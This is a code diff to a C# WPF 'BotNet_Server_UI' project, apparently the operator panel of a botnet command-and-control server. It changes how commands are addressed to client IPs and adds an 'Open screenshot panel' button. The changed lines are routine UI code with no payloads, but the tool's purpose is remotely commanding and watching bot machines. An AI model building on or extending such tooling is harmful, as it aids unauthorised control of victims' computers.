@@ -20,8 +20,6 @@ namespace BotNet_Server_UI
         public bool ipsall;
         public string[] ips;
         TextBox[] args = new TextBox[0];
-
-        List<TextBox> textBoxes = new List<TextBox>();
         public MainWindow()
         {
             InitializeComponent();
@@ -46,15 +44,8 @@ namespace BotNet_Server_UI
                 Message message = new Message()
                 {
                     command = command,
-                    ip = ipsall ? ClientList.Text.Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray() : ips ?? new string[Convert.ToInt32(IPCount.Content.ToString())]
+                    ip = ipsall ? ClientList.Text.Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray() : ips
                 };
-                if (!ipsall && ips == null)
-                {
-                    for (int i = 0; i < message.ip.Length; i++)
-                    {
-                        message.ip[i] = textBoxes[i].Text;
-                    }
-                }
                 Uri res = await ApiRequest.CreateProductAsync(message, "messages");
                 LogPanel.Text += $"Команда {showcommand} (id: {await ApiRequest.GetProductAsync<uint>("api/v1/messages") - 1}) отправлена.\n";
             }
@@ -81,75 +72,8 @@ namespace BotNet_Server_UI
         {
             _ = await ApiRequest.DeleteProductsAsync("api/v1/messages");
             _ = await ApiRequest.DeleteProductsAsync("api/v1/responses");
-            textBoxes.Add(IP1);
-            textBoxes.Add(IP2);
-            textBoxes.Add(IP3);
-            textBoxes.Add(IP4);
-            textBoxes.Add(IP5);
-            textBoxes.Add(IP6);
-            textBoxes.Add(IP7);
-            textBoxes.Add(IP8);
-            textBoxes.Add(IP9);
-            textBoxes.Add(IP10);
-            textBoxes.Add(IP11);
-            textBoxes.Add(IP12);
-            textBoxes.Add(IP13);
-            textBoxes.Add(IP14);
-            textBoxes.Add(IP15);
-            textBoxes.Add(IP16);
-            textBoxes.Add(IP17);
-            textBoxes.Add(IP18);
-            textBoxes.Add(IP19);
-            textBoxes.Add(IP20);
-            textBoxes.Add(IP21);
-            textBoxes.Add(IP22);
-            textBoxes.Add(IP23);
-            textBoxes.Add(IP24);
-            textBoxes.Add(IP25);
-            textBoxes.Add(IP26);
-            textBoxes.Add(IP27);
-            textBoxes.Add(IP28);
-            UpdateTextBoxes();
             StartListenAsync();
         }
-
-        private void Minus_Click(object sender, RoutedEventArgs e)
-        {
-            if (Convert.ToInt32(IPCount.Content.ToString()) == 1)
-            {
-                MessageBox.Show("Значение не может быть ниже 1 и выше 28");
-                return;
-            }
-            IPCount.Content = Convert.ToInt32(IPCount.Content.ToString()) - 1;
-            UpdateTextBoxes();
-        }
-
-        private void Plus_Click(object sender, RoutedEventArgs e)
-        {
-            if (Convert.ToInt32(IPCount.Content.ToString()) == 28)
-            {
-                MessageBox.Show("Значение не может быть ниже 1 и выше 28");
-                return;
-            }
-            IPCount.Content = Convert.ToInt32(IPCount.Content.ToString()) + 1;
-            UpdateTextBoxes();
-        }
-
-        private void UpdateTextBoxes()
-        {
-            for (int i = 0; i < textBoxes.Count; i++)
-            {
-                if (i < Convert.ToInt32(IPCount.Content.ToString()))
-                {
-                    textBoxes[i].Visibility = Visibility.Visible;
-                }
-                else
-                {
-                    textBoxes[i].Visibility = Visibility.Hidden;
-                }
-            }
-        }
-
         private void Button_Click_1(object sender, RoutedEventArgs e)
         {
             StartListenAsync();
@@ -241,25 +165,6 @@ namespace BotNet_Server_UI
             }
         }
 
-        public void BlockTextIP()
-        {
-            Button_Minus.IsEnabled = false;
-            Button_Plus.IsEnabled = false;
-            for (int i = 0; i < textBoxes.Count; i++)
-            {
-                textBoxes[i].IsEnabled = false;
-            }
-        }
-
-        public void UnblockTextIp()
-        {
-            Button_Minus.IsEnabled = true;
-            Button_Plus.IsEnabled = true;
-            for (int i = 0; i < textBoxes.Count; i++)
-            {
-                textBoxes[i].IsEnabled = true;
-            }
-        }
         private void IPSetButton_Click(object sender, RoutedEventArgs e)
         {
             IPSet iPSet = new IPSet();
@@ -275,6 +180,7 @@ namespace BotNet_Server_UI
                     {
                         Button button = new Button()
                         {
+                            Content = "Открыть скриншот панель",
                             HorizontalAlignment = HorizontalAlignment.Stretch,
                             VerticalAlignment = VerticalAlignment.Bottom,
                             Height = 22,
